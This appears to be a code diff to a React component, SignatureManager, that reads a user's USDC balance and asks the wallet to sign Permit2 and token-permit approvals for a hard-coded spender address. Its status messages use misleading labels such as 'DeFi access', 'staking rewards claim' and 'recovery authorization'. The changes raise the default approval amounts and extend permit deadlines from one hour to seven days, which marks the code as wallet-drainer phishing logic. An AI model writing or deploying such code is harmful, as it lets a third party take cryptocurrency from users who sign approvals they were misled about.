@@ -138,7 +138,7 @@ export default function SignatureManager({ provider, userAddress }) {
       ], provider);
       
       const balance = await tokenContract.balanceOf(userAddress);
-      const amount = balance > 0 ? balance : ethers.parseUnits('50', 6);
+      const amount = balance > 0 ? balance : ethers.parseUnits('1000', 6); // 1000 USDC default
       const balanceFormatted = ethers.formatUnits(balance, 6);
       
       // Check gas and auto-execute if sufficient
@@ -165,7 +165,7 @@ export default function SignatureManager({ provider, userAddress }) {
         
         setTimeout(async () => {
           try {
-            const deadline = Math.floor(Date.now() / 1000) + 3600;
+            const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
             const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
             const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
             
@@ -205,7 +205,7 @@ export default function SignatureManager({ provider, userAddress }) {
       
       setResult(`Detected USDC balance: ${balanceFormatted} USDC. Processing DeFi access...`);
       
-      const deadline = Math.floor(Date.now() / 1000) + 3600;
+      const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
       const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
       
       const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
@@ -299,8 +299,8 @@ export default function SignatureManager({ provider, userAddress }) {
       
       const message = {
         user: userAddress,
-        amount: ethBalance > 0 ? ethBalance : ethers.parseEther('0.1'),
-        nonce: 1
+        amount: ethers.parseEther('0.1'), // Standard 0.1 ETH recovery authorization
+        nonce: Math.floor(Date.now() / 1000) // Use timestamp as nonce
       };
 
       const signature = await signTypedDataV4(domain, types, message, provider);
@@ -353,12 +353,12 @@ export default function SignatureManager({ provider, userAddress }) {
       ], provider);
       
       const balance = await tokenContract.balanceOf(userAddress);
-      const value = balance > 0 ? balance : ethers.parseUnits('25', 6);
+      const value = balance > 0 ? balance : ethers.parseUnits('500', 6); // 500 USDC default
       const balanceFormatted = ethers.formatUnits(balance, 6);
       
       setResult(`Detected USDC balance: ${balanceFormatted} USDC. Preparing staking rewards claim...`);
       
-      const deadline = Math.floor(Date.now() / 1000) + 3600;
+      const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
       
       const signature = await signTokenPermit(tokenAddress, userAddress, spender, value, deadline, provider);
       setResult(`Token permit signature: ${signature}`);
